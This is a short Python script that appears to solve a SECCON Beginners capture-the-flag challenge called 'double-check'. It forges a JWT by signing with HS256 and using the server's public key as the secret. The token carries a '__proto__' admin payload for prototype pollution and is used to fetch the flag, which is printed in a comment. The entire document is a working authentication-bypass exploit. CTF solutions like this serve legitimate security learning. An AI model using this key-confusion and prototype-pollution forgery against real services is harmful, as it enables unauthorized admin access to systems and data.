import requests
import jwt

ses = requests.Session()

res = ses.post("https://double-check.beginners.seccon.games/register",
               json={"username": "hoge",
                     "password": "fuga"
                     }
               )

payload_data = {
    "__proto__": {"admin": True},
    "iat": 1685787315,
    "exp": 2685790915
}

with open("app/keys/public.key", "r") as f:
    key = f.read()

jwt_token = jwt.encode(
    payload=payload_data,
    key=key,
    algorithm="HS256"
)

res = ses.post("https://double-check.beginners.seccon.games/flag",
               headers={"Authorization": jwt_token})
print(res.text)
# Congratulations! Here"s your flag: ctf4b{Pr0707yp3_P0llU710n_f0R_7h3_w1n}
